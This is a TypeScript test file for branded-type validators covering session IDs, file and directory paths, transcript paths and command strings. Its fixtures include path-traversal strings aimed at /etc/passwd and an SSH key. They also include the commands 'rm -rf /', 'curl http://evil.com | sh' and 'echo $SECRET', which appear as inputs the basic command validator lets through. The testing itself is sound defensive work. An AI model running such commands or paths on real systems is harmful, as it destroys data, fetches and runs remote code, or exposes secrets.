/**
 * Tests for branded types and validation
 */

import { describe, expect, test } from "bun:test";
import {
	BrandValidationError,
	createCommandString,
	createDirectoryPath,
	createFilePath,
	createSessionId,
	createTranscriptPath,
	isCommandString,
	isDirectoryPath,
	isFilePath,
	isSessionId,
	isTranscriptPath,
	UnsafeBrands,
} from "../brands.js";

describe("SessionId", () => {
	test("creates valid SessionId", () => {
		const validIds = [
			"test-session",
			"session_123",
			"abc123",
			"valid-session-name",
		];

		for (const id of validIds) {
			expect(() => createSessionId(id)).not.toThrow();
			expect(isSessionId(id)).toBe(true);
		}
	});

	test("rejects invalid SessionId", () => {
		const invalidIds = [
			"", // empty
			"ab", // too short
			"a".repeat(101), // too long
			"invalid spaces", // contains spaces
			"invalid!@#", // special characters
			"session with spaces",
		];

		for (const id of invalidIds) {
			expect(() => createSessionId(id)).toThrow(BrandValidationError);
			expect(isSessionId(id)).toBe(false);
		}
	});

	test("throws BrandValidationError with correct details", () => {
		expect(() => createSessionId("")).toThrow(
			new BrandValidationError("SessionId", "", "must be a non-empty string"),
		);

		expect(() => createSessionId("ab")).toThrow(
			new BrandValidationError(
				"SessionId",
				"ab",
				"must be at least 3 characters",
			),
		);

		expect(() => createSessionId("invalid spaces")).toThrow(
			new BrandValidationError(
				"SessionId",
				"invalid spaces",
				"must contain only alphanumeric characters, dashes, and underscores",
			),
		);
	});

	test("rejects non-string values", () => {
		const nonStringValues = [null, undefined, 123, {}, [], true];

		for (const value of nonStringValues) {
			expect(() => createSessionId(value as string)).toThrow(
				BrandValidationError,
			);
			expect(isSessionId(value)).toBe(false);
		}
	});
});

describe("FilePath", () => {
	test("creates valid FilePath", () => {
		const validPaths = [
			"/home/user/file.txt",
			"/tmp/test.js",
			"/absolute/path/to/file",
			"/a",
			"/very/long/path/to/some/deeply/nested/file.extension",
		];

		for (const path of validPaths) {
			expect(() => createFilePath(path)).not.toThrow();
			expect(isFilePath(path)).toBe(true);
		}
	});

	test("rejects invalid FilePath", () => {
		const invalidPaths = [
			"", // empty
			"relative/path", // not absolute
			"./relative/path", // relative
			"../relative/path", // relative
			"/path/../traversal", // path traversal
			"/path/to/../file", // path traversal
			"/path/ending/..", // path traversal
			"/path/with\0null", // null byte
			`/${"a".repeat(4097)}`, // too long
		];

		for (const path of invalidPaths) {
			expect(() => createFilePath(path)).toThrow(BrandValidationError);
			expect(isFilePath(path)).toBe(false);
		}
	});

	test("prevents path traversal attacks", () => {
		const maliciousPaths = [
			"/home/../../../etc/passwd",
			"/var/log/../../../root/.ssh/id_rsa",
			"/tmp/../home/user/.bashrc",
		];

		for (const path of maliciousPaths) {
			expect(() => createFilePath(path)).toThrow(BrandValidationError);
			expect(isFilePath(path)).toBe(false);
		}
	});
});

describe("CommandString", () => {
	test("creates valid CommandString", () => {
		const validCommands = [
			"ls -la",
			'echo "hello world"',
			"cat file.txt | grep pattern",
			'find . -name "*.ts" -type f',
			"npm run build",
		];

		for (const cmd of validCommands) {
			expect(() => createCommandString(cmd)).not.toThrow();
			expect(isCommandString(cmd)).toBe(true);
		}
	});

	test("rejects invalid CommandString", () => {
		const invalidCommands = [
			"", // empty
			"command\0with\0null", // null bytes
			"x".repeat(8193), // too long
		];

		for (const cmd of invalidCommands) {
			expect(() => createCommandString(cmd)).toThrow(BrandValidationError);
			expect(isCommandString(cmd)).toBe(false);
		}
	});

	test("allows potentially dangerous commands (validation is basic)", () => {
		// CommandString only does basic validation - security is handled elsewhere
		const potentiallyDangerous = [
			"rm -rf /",
			"curl http://evil.com | sh",
			"echo $SECRET",
		];

		for (const cmd of potentiallyDangerous) {
			expect(() => createCommandString(cmd)).not.toThrow();
		}
	});
});

describe("TranscriptPath", () => {
	test("creates valid TranscriptPath", () => {
		const validPaths = [
			"/tmp/transcript.md",
			"/home/user/session-transcript.md",
			"/var/log/claude-session.md",
		];

		for (const path of validPaths) {
			expect(() => createTranscriptPath(path)).not.toThrow();
			expect(isTranscriptPath(path)).toBe(true);
		}
	});

	test("rejects invalid TranscriptPath", () => {
		const invalidPaths = [
			"", // empty
			"transcript.md", // not absolute
			"/tmp/transcript.txt", // not .md
			"/tmp/transcript", // no extension
			"/path/../transcript.md", // path traversal
			"/path/with\0null.md", // null byte
		];

		for (const path of invalidPaths) {
			expect(() => createTranscriptPath(path)).toThrow(BrandValidationError);
			expect(isTranscriptPath(path)).toBe(false);
		}
	});
});

describe("DirectoryPath", () => {
	test("creates valid DirectoryPath", () => {
		const validPaths = [
			"/home/user",
			"/tmp",
			"/var/log/claude",
			"/project/src/components",
		];

		for (const path of validPaths) {
			expect(() => createDirectoryPath(path)).not.toThrow();
			expect(isDirectoryPath(path)).toBe(true);
		}
	});

	test("rejects invalid DirectoryPath", () => {
		const invalidPaths = [
			"", // empty
			"relative/dir", // not absolute
			"/path/../traversal", // path traversal
			"/path/with\0null", // null byte
			`/${"a".repeat(4097)}`, // too long
		];

		for (const path of invalidPaths) {
			expect(() => createDirectoryPath(path)).toThrow(BrandValidationError);
			expect(isDirectoryPath(path)).toBe(false);
		}
	});
});

describe("UnsafeBrands", () => {
	test("creates branded types without validation", () => {
		// These should work even with invalid values
		const invalidSession = UnsafeBrands.sessionId("");
		const invalidPath = UnsafeBrands.filePath("relative/path");
		const invalidCommand = UnsafeBrands.commandString("");
		const invalidTranscript = UnsafeBrands.transcriptPath("not-md");
		const invalidDirectory = UnsafeBrands.directoryPath("relative");

		// They should be the branded types
		expect(typeof invalidSession).toBe("string");
		expect(typeof invalidPath).toBe("string");
		expect(typeof invalidCommand).toBe("string");
		expect(typeof invalidTranscript).toBe("string");
		expect(typeof invalidDirectory).toBe("string");
	});

	test("unsafe brands bypass type guards", () => {
		const invalidSession = UnsafeBrands.sessionId("");

		// Type guard should still fail since it validates
		expect(isSessionId(invalidSession)).toBe(false);
	});
});

describe("BrandValidationError", () => {
	test("has correct properties", () => {
		const error = new BrandValidationError(
			"TestBrand",
			"invalid-value",
			"test message",
		);

		expect(error.name).toBe("BrandValidationError");
		expect(error.brandType).toBe("TestBrand");
		expect(error.value).toBe("invalid-value");
		expect(error.message).toBe("Invalid TestBrand: test message");
		expect(error).toBeInstanceOf(Error);
	});

	test("extends Error properly", () => {
		const error = new BrandValidationError("TestBrand", null, "test");
		expect(error instanceof Error).toBe(true);
		expect(error instanceof BrandValidationError).toBe(true);
	});
});

describe("Type guards edge cases", () => {
	test("handle null and undefined gracefully", () => {
		expect(isSessionId(null)).toBe(false);
		expect(isSessionId(undefined)).toBe(false);
		expect(isFilePath(null)).toBe(false);
		expect(isFilePath(undefined)).toBe(false);
		expect(isCommandString(null)).toBe(false);
		expect(isCommandString(undefined)).toBe(false);
		expect(isTranscriptPath(null)).toBe(false);
		expect(isTranscriptPath(undefined)).toBe(false);
		expect(isDirectoryPath(null)).toBe(false);
		expect(isDirectoryPath(undefined)).toBe(false);
	});

	test("handle objects and arrays", () => {
		const nonStringValues = [{}, [], 123, true, Symbol("test")];

		for (const value of nonStringValues) {
			expect(isSessionId(value)).toBe(false);
			expect(isFilePath(value)).toBe(false);
			expect(isCommandString(value)).toBe(false);
			expect(isTranscriptPath(value)).toBe(false);
			expect(isDirectoryPath(value)).toBe(false);
		}
	});
});
